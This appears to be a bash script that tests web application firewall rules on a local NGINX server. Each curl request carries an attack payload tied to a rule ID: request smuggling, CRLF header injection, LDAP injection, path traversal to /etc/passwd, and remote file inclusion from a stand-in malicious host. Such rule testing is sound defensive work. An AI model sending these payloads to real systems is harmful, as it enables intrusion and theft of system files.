#!/bin/bash

# URL of the NGINX server
URL="http://localhost:8080"

# Test HTTP Request Smuggling Attack (RuleId: 921110)
echo "Testing HTTP Request Smuggling Attack"
curl -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 10" --data "0\r\n\r\n" $URL
echo ""

# Test HTTP Response Splitting Attack (RuleId: 921120, 921130)
echo "Testing HTTP Response Splitting Attack"
curl -X GET "$URL/somepath" -H "Host: example.com%0d%0aX-injected-header: injected-value"
echo ""

# Test HTTP Header Injection Attack (RuleId: 921140, 921150, 921151, 921160)
echo "Testing HTTP Header Injection Attack"
curl -X GET "$URL/somepath" -H "Custom-Header: Value%0d%0aInjected-Header: InjectedValue"
echo ""

# Test HTTP Splitting (CR/LF in request filename) (RuleId: 921190)
echo "Testing HTTP Splitting (CR/LF in request filename)"
curl -X GET "$URL/somepath%0d%0aInjectedPath"
echo ""

# Test LDAP Injection Attack (RuleId: 921200)
echo "Testing LDAP Injection Attack"
curl -X GET "$URL/somepath?query=%29%28%7c%29%29%28%29%29" # Replace with your LDAP injection pattern
echo ""

# Test Path Traversal Attack (RuleId: 930100, 930110)
echo "Testing Path Traversal Attack"
curl -X GET "$URL/../../etc/passwd"
echo ""

# Test OS File Access Attempt (RuleId: 930120)
echo "Testing OS File Access Attempt"
curl -X GET "$URL/boot.ini"
echo ""

# Test Restricted File Access Attempt (RuleId: 930130)
echo "Testing Restricted File Access Attempt"
curl -X GET "$URL/secret.key"
echo ""

# Test Remote File Inclusion Attack (RuleId: 931100, 931110, 931120, 931130)
echo "Testing Remote File Inclusion Attack"
curl -X GET "$URL/somepath?file=http://malicious.com/evil.txt"
echo ""
